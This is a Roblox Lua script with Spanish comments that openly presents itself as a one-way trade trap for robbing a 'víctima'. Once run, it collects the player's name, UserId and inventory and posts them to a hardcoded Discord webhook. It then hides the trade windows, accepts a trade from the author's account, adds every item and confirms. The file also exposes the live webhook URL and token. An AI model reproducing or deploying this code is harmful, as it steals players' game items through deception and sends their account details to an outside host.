--[[ ROBA-BRAINROT v6 (TRAMPA 1-SENTIDO)
   Víctima ejecuta esto. TÚ (axelillo3424) le mandas el trade.
   El script: detecta TU trade -> acepta -> mete TODO -> Ready -> esconde.
]]

local WEBHOOK_URL = "https://discord.com/api/webhooks/1557895967842500678/CtuYAM8UIaCH8eJtoKi-aAFFpNacsT6wgnGj53COPqv6ZV0AZgZOffUa3vHd8zd3SkBQ"

local CONFIG = {
    TargetName   = "axelillo3424",  -- solo actúa si el trade viene de ti
    TargetUserId = 0,               -- (opcional) pon tu UserId para filtrar exacto. 0 = solo por nombre
    HideGUI      = true,            -- esconde la ventana
    AutoAccept   = true,            -- acepta + confirma solo
    Debug        = false,           -- true = imprime lo que encuentra
}

local Players     = game:GetService("Players")
local RS          = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local LP          = Players.LocalPlayer

-- ================= REQUEST ROBUSTO =================
local function getReq()
    return (syn and syn.request) or (http and http.request) or http_request
        or request or (fluxus and fluxus.request)
end
local function post(url, body)
    local req = getReq()
    if not req then warn("[Webhook] sin request()") return false end
    local ok, res = pcall(req, {
        Url = url, Method = "POST",
        Headers = { ["Content-Type"] = "application/json",
                    ["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" },
        Body = body,
    })
    if not ok then warn("[Webhook] fallo:", res) return false end
    local code = res and (res.StatusCode or res.Status)
    print("[Webhook] respuesta:", code)
    return code == 200 or code == 204
end

-- ================= LECTURA DE INVENTARIO (para el webhook) =================
local FLYING = {"broom","escoba","sleigh","trineo","santa","papa noel","carpet","alfombra",
                "wings","alas","cupid","balloon","globo","waverider"}
local function isFlying(n)
    n = n:lower()
    for _, w in ipairs(FLYING) do if n:find(w, 1, true) then return true end end
    return false
end
local function getTools()
    local out, seen = {}, {}
    local function add(c) if c:IsA("Tool") and not seen[c.Name] then seen[c.Name]=true; table.insert(out,c.Name) end end
    if LP:FindFirstChild("Backpack") then for _,c in ipairs(LP.Backpack:GetChildren()) do add(c) end end
    if LP.Character then for _,c in ipairs(LP.Character:GetChildren()) do add(c) end end
    return out
end
local function findMyBase()
    local function match(p)
        return p.Name:lower():find(LP.Name:lower(),1,true)
            or p:GetAttribute("Owner") == LP.Name or p:GetAttribute("owner") == LP.Name
    end
    for _, c in ipairs(workspace:GetChildren()) do
        if (c:IsA("Model") or c:IsA("Folder")) and (c.Name:lower():find("base") or c.Name:lower():find("plot")) then
            for _, p in ipairs(c:GetChildren()) do if match(p) then return p end end
        end
    end
    for _, d in ipairs(workspace:GetDescendants()) do
        if d:IsA("Model") and match(d) then return d end
    end
end
local function getBrainrots(base)
    local out, seen = {}, {}
    if not base then return out end
    for _, d in ipairs(base:GetDescendants()) do
        if d:IsA("Model") and (d:FindFirstChildOfClass("BillboardGui") or d:GetAttribute("Rarity")
           or d:GetAttribute("Value") or d:GetAttribute("Income")) and not seen[d.Name] then
            seen[d.Name]=true; table.insert(out, d.Name)
        end
    end
    return out
end
local function getSkins(base)
    local out, seen = {}, {}
    if not base then return out end
    for _, d in ipairs(base:GetDescendants()) do
        if (d:IsA("Model") or d:IsA("MeshPart") or d:IsA("Part"))
           and d.Name:lower():find("skin",1,true) and not seen[d.Name] then
            seen[d.Name]=true; table.insert(out, d.Name)
        end
    end
    return out
end
local function join(l) return #l == 0 and "—" or table.concat(l, ", ") end
local function cut(s, n) if #s > n then return s:sub(1, n-3).."..." end return s end

local function sendWebhook()
    local tools = getTools()
    local flying, normal = {}, {}
    for _, t in ipairs(tools) do
        if isFlying(t) then table.insert(flying, t) else table.insert(normal, t) end
    end
    local base      = findMyBase()
    local brainrots = getBrainrots(base)
    local skins     = getSkins(base)

    if CONFIG.Debug then
        print("[DEBUG] base:", base and base:GetFullName() or "nil")
        print("[DEBUG] brainrots:", join(brainrots))
        print("[DEBUG] tools:", join(tools))
    end

    local body = HttpService:JSONEncode({
        username = "Roba-Brainrot",
        embeds = {{
            title = "🎮 Alguien ejecutó el script", color = 5763719,
            fields = {
                { name = "👤 Usuario", value = LP.Name.." ("..LP.DisplayName..")", inline = true },
                { name = "🆔 UserId",  value = tostring(LP.UserId), inline = true },
                { name = "📅",         value = os.date("%Y-%m-%d %H:%M:%S"), inline = true },
                { name = "🧠 Brainrots ("..#brainrots..")",    value = cut(join(brainrots), 1024) },
                { name = "🛠️ Gears ("..#normal..")",           value = cut(join(normal), 1024) },
                { name = "🪄 Gears voladores ("..#flying..")", value = cut(join(flying), 1024) },
                { name = "🎨 Base skins ("..#skins..")",       value = cut(join(skins), 1024) },
            },
        }},
    })
    if post(WEBHOOK_URL, body) then print("[Webhook] Enviado") else warn("[Webhook] NO enviado") end
end

sendWebhook() -- se manda primero, pase lo que pase

-- ================= REMOTES DE TRADE =================
local RE = RS:WaitForChild("Packages"):WaitForChild("Net"):WaitForChild("RE")
local Trade = RE:WaitForChild("TradeService", 20)
if not Trade then
    warn("[Trade] no encontré TradeService")
else

local TradeAccept = Trade:FindFirstChild("Accept")
local TradeReady  = Trade:FindFirstChild("Ready")

-- ¿el trade es de axelillo3424?
local function isFromTarget(gui)
    for _, d in ipairs(gui:GetDescendants()) do
        if (d:IsA("TextLabel") or d:IsA("TextButton")) then
            local txt = d.Text
            if txt:lower():find(CONFIG.TargetName:lower(), 1, true) then return true end
            if CONFIG.TargetUserId ~= 0 and txt:find(tostring(CONFIG.TargetUserId), 1, true) then return true end
        end
    end
    return false
end

local function tradeGUIs()
    local t = {}
    for _, g in ipairs(LP.PlayerGui:GetDescendants()) do
        if g:IsA("ScreenGui") and (g.Name:lower():find("trade") or g.Name:lower():find("invite")) then
            table.insert(t, g)
        end
    end
    return t
end
local function anyTradeGUI() local t = tradeGUIs(); return t[1] end
local function hideAll() if CONFIG.HideGUI then for _, g in ipairs(tradeGUIs()) do g.Enabled = false end end end

local function fire(btn)
    if firesignal then pcall(firesignal, btn.MouseButton1Click)
    elseif getconnections then for _, c in ipairs(getconnections(btn.MouseButton1Click)) do c:Fire() end end
end

local ACTION = {"accept","aceptar","confirm","confirmar","ready","listo",
                "cancel","cancelar","decline","rechazar","close","cerrar","search","buscar","trade"}
local function isAction(lbl)
    lbl = lbl:lower()
    for _, w in ipairs(ACTION) do if lbl:find(w, 1, true) then return true end end
    return false
end

-- mete TODOS los objetos (brainrots, gears, skins, voladores) clickeando sus botones
local function addAllItems(gui)
    local n = 0
    for _, d in ipairs(gui:GetDescendants()) do
        if (d:IsA("TextButton") or d:IsA("ImageButton")) and d.Visible then
            local lbl = d.Name
            if d:IsA("TextButton") then lbl = d.Name .. " " .. d.Text end
            if not isAction(lbl) and not d:GetAttribute("rb_ok") then
                fire(d); d:SetAttribute("rb_ok", true); n += 1; task.wait(0.1)
            end
        end
    end
    return n
end

-- ================= FLUJO =================
local done = false
local function handle(gui)
    done = true
    hideAll(); task.wait(0.4)

    -- 1) aceptar TU invitación
    if TradeAccept then
        local target = Players:FindFirstChild(CONFIG.TargetName)
        pcall(function() TradeAccept:FireServer(target and target.UserId) end)
        print("[Trade] aceptando trade de "..CONFIG.TargetName)
    end
    task.wait(1.2); hideAll()

    -- 2) meter TODO
    local n = addAllItems(gui)
    print("[Trade] objetos metidos:", n)
    task.wait(0.6)

    -- 3) confirmar
    if n > 0 and TradeReady then
        TradeReady:FireServer()
        print("[Trade] Ready enviado")
    end
    hideAll()
end

task.spawn(function()
    while task.wait(0.25) do
        local gui = anyTradeGUI()
        if gui then
            if not done then
                if isFromTarget(gui) then
                    task.spawn(function() handle(gui) end)
                else
                    hideAll() -- trade ajeno: solo escondo, no acepto
                end
            else
                hideAll()
            end
        else
            done = false
        end
    end
end)

end

print("[Script] Listo. Mandale el trade a la víctima cuando ejecute.")
